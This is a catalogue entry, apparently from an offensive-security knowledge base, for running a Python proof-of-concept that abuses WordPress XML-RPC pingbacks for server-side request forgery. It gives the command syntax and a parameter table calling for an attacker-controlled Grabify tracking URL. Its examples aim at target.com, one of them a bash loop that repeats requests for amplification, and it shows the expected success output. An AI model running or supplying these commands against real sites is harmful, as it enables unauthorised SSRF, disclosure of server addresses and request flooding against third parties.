---
id: cmd-run-iandunn-001
data: python iandunn.py <target_xmlrpc_url> <tracking_url> <wait_time>
tags:
  - ssrf
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:02.045Z'
verified: false
validated: true
submitted: true
---
# run-iandunn-poc

## Command

```bash
python iandunn.py <target_xmlrpc_url> <tracking_url> <wait_time>
```

## Description

This command executes the custom Python PoC script iandunn.py to send multiple XML-RPC pingback requests to a WordPress xmlrpc.php endpoint, exploiting SSRF by forcing the server to fetch the specified tracking URL. It is used in scenarios where pingback validation lacks URL restrictions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<target_xmlrpc_url>` | Full URL to the target's /wordpress/xmlrpc.php endpoint | Yes |
| `<tracking_url>` | Attacker-controlled URL (e.g., Grabify link) to force fetch | Yes |
| `<wait_time>` | Seconds to wait between requests for amplification (e.g., 5) | Yes |

## Examples

### Basic Usage

```bash
python iandunn.py https://target.com/wordpress/xmlrpc.php https://grabify.link/XXXXXX 5
```

### Advanced Usage

Run with more iterations by modifying the script, or chain with loops:

```bash
for i in {1..10}; do python iandunn.py https://target.com/wordpress/xmlrpc.php https://grabify.link/XXXXXX 2; done
```

## Expected Output

The script prints XML-RPC responses, such as:

- Successful ping: HTTP 200 with pingback ID
- Error: Fault string like 'Invalid pingback source'

Example success:
```
Sending pingback request...
Response: <Response 200 OK>
Pingback submitted successfully.
```

No output indicates network issues; check connectivity.

## Related

- [[Related Procedure|procedures/Exploit-SSRF-with-WordPress-Pingback-PoC]]
